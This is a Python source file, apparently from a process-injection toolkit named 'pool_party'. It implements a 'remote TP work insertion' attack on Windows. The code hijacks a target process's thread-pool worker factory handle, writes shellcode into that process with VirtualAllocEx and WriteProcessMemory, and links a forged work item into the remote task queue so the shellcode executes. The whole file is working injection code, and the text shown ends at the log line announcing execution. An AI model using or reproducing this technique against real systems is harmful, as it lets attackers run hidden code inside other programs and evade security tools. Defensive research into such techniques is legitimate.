import ctypes

from pool_party import *
from write_shellcode import *


class RemoteTPWorkInsertion(PoolParty):
    def __init__(self, process_name):
        super().__init__(process_name)
        self.process_handle = HANDLE(0)
        self.worker_factory_handle = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.worker_factory_handle = self.hijack_process_handle(TP_WORKER_FACTORY_OBJECT_NAME,
                                                                ULONG(WORKER_FACTORY_ALL_ACCESS))
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        worker_factory_information = (ctypes.c_ubyte * SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT)()
        nt_status = NtQueryInformationWorkerFactory(self.worker_factory_handle, WorkerFactoryBasicInformation,
                                                    POINTER(ctypes.c_ubyte)(worker_factory_information),
                                                    SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT, None)
        if nt_status != 0:
            logging.error("[-] NtQueryInformationWorkerFactory failed with NTSTATUS 0x{:x}".format(nt_status))
            return False

        full_tp_pool_buffer = (ctypes.c_ubyte * SIZE_OF_FULL_TP_POOL_STRUCT)()
        start_parameter = convert_buffer_to_struct(worker_factory_information, LPVOID, 0x50)
        if not ReadProcessMemory(self.process_handle, start_parameter, POINTER(ctypes.c_ubyte)(full_tp_pool_buffer),
                                 SIZE_OF_FULL_TP_POOL_STRUCT, None):
            logging.error("[-] ReadProcessMemory Full TP Pool Buffer failed with error code %d" % GetLastError())
            return False

        target_task_queue_high_priority_list = convert_buffer_to_struct(full_tp_pool_buffer, ctypes.c_uint64, 0x10)
        tp_work_ptr = CreateThreadpoolWork(self.shellcode_address, None, None)
        if tp_work_ptr == LPVOID(0):
            logging.error("[-] CreateThreadpoolWork threadpool failed with error code %d" % GetLastError())
            return False

        tp_work_cleanup_group_member_pool = convert_buffer_to_struct(tp_work_ptr, ctypes.c_uint64, 0x90)
        tp_work_cleanup_group_member_pool.value = start_parameter.value

        tp_work_task_list_entry_flink = convert_buffer_to_struct(tp_work_ptr, ctypes.c_uint64, 0xD8)
        tp_work_task_list_entry_flink.value = target_task_queue_high_priority_list.value

        tp_work_task_list_entry_blink = convert_buffer_to_struct(tp_work_ptr, ctypes.c_uint64, 0xE0)
        tp_work_task_list_entry_blink.value = target_task_queue_high_priority_list.value

        tp_work_work_state_exchange = convert_buffer_to_struct(tp_work_ptr, ctypes.c_uint32, 0xE8)
        tp_work_work_state_exchange.value = 0x2

        remote_tp_work = VirtualAllocEx(self.process_handle, None, SIZE_OF_FULL_TP_WORK_STRUCT,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if remote_tp_work is None:
            logging.error("[-] VirtualAllocEx for Remote Tp Work failed with error code: %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, remote_tp_work, tp_work_ptr, SIZE_OF_FULL_TP_WORK_STRUCT, None):
            logging.error("[-] WriteProcessMemory for Remote Tp Work failed with error code: %d" % GetLastError())
            return False

        task_queue_flink = convert_buffer_to_struct(full_tp_pool_buffer, LPVOID, 0x10).value
        task_queue_blink = task_queue_flink + 0x8
        remote_work_item_task_list_address = LPVOID(ctypes.cast(remote_tp_work, ctypes.c_void_p).value + 0xD8)
        if not WriteProcessMemory(self.process_handle, task_queue_flink,
                                  ctypes.POINTER(ctypes.c_void_p)(remote_work_item_task_list_address), 8, None):
            logging.error("[-] WriteProcessMemory for Task Queue Flink failed with error code: %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, task_queue_blink,
                                  ctypes.POINTER(ctypes.c_void_p)(remote_work_item_task_list_address), 8, None):
            logging.error("[-] WriteProcessMemory for Task Queue Blink failed with error code: %d" % GetLastError())
            return False

        logging.info("[+] Executing shellcode....")
